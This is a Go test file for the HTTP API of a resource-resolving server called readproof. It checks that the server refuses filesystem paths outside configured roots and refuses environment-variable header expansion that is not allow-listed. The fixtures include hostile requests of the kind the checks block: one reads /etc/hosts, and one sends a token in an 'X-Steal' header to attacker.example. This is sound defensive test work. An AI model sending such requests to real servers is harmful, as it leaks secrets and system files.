package api_test

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/fbzz/readproof/internal/api"
	"github.com/fbzz/readproof/internal/app"
	"github.com/fbzz/readproof/internal/client/remote"
	"github.com/fbzz/readproof/internal/policy"
	"github.com/fbzz/readproof/internal/resource"
	"github.com/fbzz/readproof/internal/source"
)

// serverWithOptions starts an httptest server over an App carrying a server
// source policy — what `readproofd` runs with, in-process.
func serverWithOptions(t *testing.T, opts app.Options) (*app.App, *httptest.Server) {
	t.Helper()
	a, err := app.OpenWithOptions(t.TempDir(), opts)
	if err != nil {
		t.Fatalf("open app: %v", err)
	}
	t.Cleanup(func() { a.Close() })
	return a, newServer(t, a)
}

// newServer wraps an already-open App in the HTTP API.
func newServer(t *testing.T, a *app.App) *httptest.Server {
	t.Helper()
	server := httptest.NewServer(api.NewHandler(a, api.Options{}))
	t.Cleanup(server.Close)
	return server
}

func postJSON(t *testing.T, url string, body any) (int, string) {
	t.Helper()
	encoded, err := json.Marshal(body)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	resp, err := http.Post(url, "application/json", strings.NewReader(string(encoded)))
	if err != nil {
		t.Fatalf("post %s: %v", url, err)
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read response: %v", err)
	}
	var out struct {
		Error string `json:"error"`
	}
	if err := json.Unmarshal(raw, &out); err == nil && out.Error != "" {
		return resp.StatusCode, out.Error
	}
	return resp.StatusCode, string(raw)
}

// RP-01: on a server with no --filesystem-root, registering a filesystem
// source is refused at registration — with the flag named — rather than
// accepted and then failing on the first resolve.
func TestRegisterFilesystemSourceRefusedWithNoRoots(t *testing.T) {
	_, server := serverWithOptions(t, app.ServerOptions())

	status, message := postJSON(t, server.URL+"/v1/resources", map[string]any{
		"uri":    "readproof://pwn/etc/hosts",
		"source": map[string]any{"kind": "filesystem", "filesystem": map[string]any{"path": "/etc/hosts"}},
		"policy": map[string]any{"strategy": "require_fresh"},
	})
	if status != http.StatusBadRequest {
		t.Fatalf("status = %d (%s), want 400", status, message)
	}
	if !strings.Contains(message, "--filesystem-root") {
		t.Fatalf("error %q does not name --filesystem-root", message)
	}
}

// With a root configured, a path inside it registers and resolves; a path
// outside it is refused at registration.
func TestRegisterFilesystemSourceHonoursRoots(t *testing.T) {
	root := t.TempDir()
	inside := filepath.Join(root, "refunds.md")
	if err := os.WriteFile(inside, []byte("30 days\n"), 0o600); err != nil {
		t.Fatalf("write fixture: %v", err)
	}

	opts := app.ServerOptions()
	opts.FilesystemRoots = []string{root}
	_, server := serverWithOptions(t, opts)

	c := remote.New(server.URL, "")
	defer c.Close()
	ctx := t.Context()

	if err := c.RegisterResource(ctx, resource.Resource{
		URI:       "readproof://demo/policies/refunds",
		Namespace: "demo",
		Path:      "policies/refunds",
		SourceConfig: source.Config{
			Kind:       source.KindFilesystem,
			Filesystem: &source.FilesystemConfig{Path: inside},
		},
		Policy: policy.Policy{Strategy: policy.StrategyRequireFresh},
	}); err != nil {
		t.Fatalf("register a resource inside the root: %v", err)
	}
	result, err := c.Resolve(ctx, "readproof://demo/policies/refunds")
	if err != nil {
		t.Fatalf("resolve a resource inside the root: %v", err)
	}
	if string(result.Content) != "30 days\n" {
		t.Fatalf("content = %q", result.Content)
	}

	status, message := postJSON(t, server.URL+"/v1/resources", map[string]any{
		"uri":    "readproof://pwn/etc/hosts",
		"source": map[string]any{"kind": "filesystem", "filesystem": map[string]any{"path": "/etc/hosts"}},
		"policy": map[string]any{"strategy": "require_fresh"},
	})
	if status != http.StatusBadRequest {
		t.Fatalf("registering a path outside the root: status = %d (%s), want 400", status, message)
	}
	if !strings.Contains(message, "outside every configured") {
		t.Fatalf("error %q does not explain the refusal", message)
	}
}

// RP-02: on a server, a "${VAR}" header is refused at registration unless the
// variable is allow-listed, and the refusal names both the variable and the
// flag.
func TestRegisterHTTPHeaderEnvRefusedWithoutAllowlist(t *testing.T) {
	t.Setenv("READPROOF_TEST_TOKEN", "the-real-secret")
	_, server := serverWithOptions(t, app.ServerOptions())

	status, message := postJSON(t, server.URL+"/v1/resources", map[string]any{
		"uri": "readproof://pwn/steal",
		"source": map[string]any{"kind": "http", "http": map[string]any{
			"url":     "https://attacker.example/",
			"headers": map[string]string{"X-Steal": "${READPROOF_TEST_TOKEN}"},
		}},
		"policy": map[string]any{"strategy": "require_fresh"},
	})
	if status != http.StatusBadRequest {
		t.Fatalf("status = %d (%s), want 400", status, message)
	}
	for _, want := range []string{"READPROOF_TEST_TOKEN", "--header-env-allow"} {
		if !strings.Contains(message, want) {
			t.Fatalf("error %q does not mention %q", message, want)
		}
	}
	if strings.Contains(message, "the-real-secret") {
		t.Fatalf("the refusal echoed the variable's value: %q", message)
	}

	// Allow-listed, the same registration is accepted.
	opts := app.ServerOptions()
	opts.HeaderEnvAllowlist = []string{"READPROOF_TEST_TOKEN"}
	_, allowing := serverWithOptions(t, opts)
	status, message = postJSON(t, allowing.URL+"/v1/resources", map[string]any{
		"uri": "readproof://demo/docs",
		"source": map[string]any{"kind": "http", "http": map[string]any{
			"url":     "https://docs.example/",
			"headers": map[string]string{"Authorization": "Bearer ${READPROOF_TEST_TOKEN}"},
		}},
		"policy": map[string]any{"strategy": "require_fresh"},
	})
	if status != http.StatusCreated {
		t.Fatalf("allow-listed registration: status = %d (%s), want 201", status, message)
	}
}

// A row registered before the policy existed — or under a wider one — must
// still be refused at resolve, because the adapter, not the registration
// handler, is the enforcement point. The refusal is a 400 with the reason,
// not a generic 500.
func TestResolveRefusesAPreExistingFilesystemRow(t *testing.T) {
	dir := t.TempDir()
	outside := filepath.Join(dir, "secret.txt")
	if err := os.WriteFile(outside, []byte("top secret\n"), 0o600); err != nil {
		t.Fatalf("write fixture: %v", err)
	}
	uri := "readproof://demo/secret"

	// Registered by an unrestricted (embedded) App over the same data dir…
	permissive, err := app.OpenWithOptions(dir+"/data", app.Options{})
	if err != nil {
		t.Fatalf("open permissive app: %v", err)
	}
	if err := permissive.Resources.Create(t.Context(), resource.Resource{
		URI:       uri,
		Namespace: "demo",
		Path:      "secret",
		SourceConfig: source.Config{
			Kind:       source.KindFilesystem,
			Filesystem: &source.FilesystemConfig{Path: outside},
		},
		Policy: policy.Policy{Strategy: policy.StrategyRequireFresh},
	}); err != nil {
		t.Fatalf("create resource: %v", err)
	}
	permissive.Close()

	// …then served by a restricted one, which must refuse to resolve it.
	restricted, err := app.OpenWithOptions(dir+"/data", app.ServerOptions())
	if err != nil {
		t.Fatalf("open restricted app: %v", err)
	}
	defer restricted.Close()
	server := httptest.NewServer(api.NewHandler(restricted, api.Options{}))
	defer server.Close()

	status, message := postJSON(t, server.URL+"/v1/resolve", map[string]any{"uri": uri})
	if status != http.StatusBadRequest {
		t.Fatalf("status = %d (%s), want 400", status, message)
	}
	if !strings.Contains(message, "--filesystem-root") {
		t.Fatalf("error %q does not name --filesystem-root", message)
	}
	if strings.Contains(message, "top secret") {
		t.Fatalf("the refusal leaked the file's content: %q", message)
	}
}
